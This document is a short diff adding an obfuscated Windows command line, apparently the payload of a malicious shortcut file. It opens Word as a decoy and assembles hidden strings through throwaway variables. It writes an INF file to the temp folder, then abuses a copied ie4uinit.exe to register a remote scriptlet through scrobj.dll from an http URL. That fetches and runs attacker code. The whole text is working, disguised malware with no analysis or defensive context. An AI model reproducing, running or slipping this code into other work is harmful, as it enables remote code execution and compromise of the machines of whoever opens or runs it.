@@ -1,0 +1,22 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %q in ("tartarly=c" "peric=t" "unambushkar=l" "filth=s" "unvoyagingu=e" ) do @set %~q) &&
+  (for %j in ("B") do @set "mont=%~j") &&
+  callcall(for %i in ("o") do @set "preworthil=%~i") &&
+  (for %t in ("\") do @set "caustici=%~t") &&
+  callcall(for %k in ("b") do @set "pailowp=%~k") &&
+  (for %q in ("0") do @set "attunement=%~q") &&
+  call(for %c in ("u") do @set "balearic=%~c") &&
+  callcallcall(for %s in ("%temp%") do @set "nonincarn=%~s") &&
+  callcall(for %o in ("w") do @set "zonat=%~o") &&
+  callcall(for %h in ("_") do @set "cinem=%~h") &&
+  callcall(for %a in ("a") do @set "adsorb=%~a") &&
+  (for %m in ("A") do @set "mora=%~m") &&
+  callcall(for %u in ("d") do @set "cli=%~u") &&
+  callcall(for %x in ("s") do @set "trioecio=%~x") &&
+  (for %o in ("n") do @set "jugs=%~o") &&
+  (for %n in ("m") do @set "rear=%~n") &&
+  callcall(for %v in ("s") do @set "trioecio=%~v") &&
+  (for %q in ("k") do @set "zimmerwald=%~q") &&
+  call(for %j in ("e") do @set "dynamit=%~j") &&
+  callcallcallcallcallcallcall(for %y in ("[version]" "signature=$windows nt$" "[destinationdirs]" "defaultdestdir=11" "8CA6A=01" "[strings]" "servicename= 'art'" "shortsvcname= 'art'" "fish=." "sulphoxismu=/" "unhurte=I" "sexagesima=a" "twiggiesti=b" "expectan=c" "tra=e" "hconv=f" "interluc=i" "photopile=l" "stephani=m" "polyhy=n" "lurching=o" "mammo=p" "stygi=r" "rateabil=s" "colberte=t" "clie=u" "fsie=w" "loon=y" "[dikeriain_F3B10B]" "%rateabil%c%stygi%o%twiggiesti%\" "j%fish%d%photopile%l,N%unhurte%,h%colberte%t%mammo%:%sulphoxismu%/%loon%r%hconv%g%sexagesima%f%fish%m%sexagesima%l%tra%n%tra%b%clie%t%photopile%e%stygi%.%expectan%o%stephani%/%polyhy%s%lurching%v%fsie%t" "[8CA6A]" "i%tra%u%interluc%n%interluc%t%fish%i%polyhy%f" "[defaultinstall.windows7]" "delfiles=8CA6A" "Un\" "Register\" "OCXs=dikeriain_F3B10B" ) do @echo %~y) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
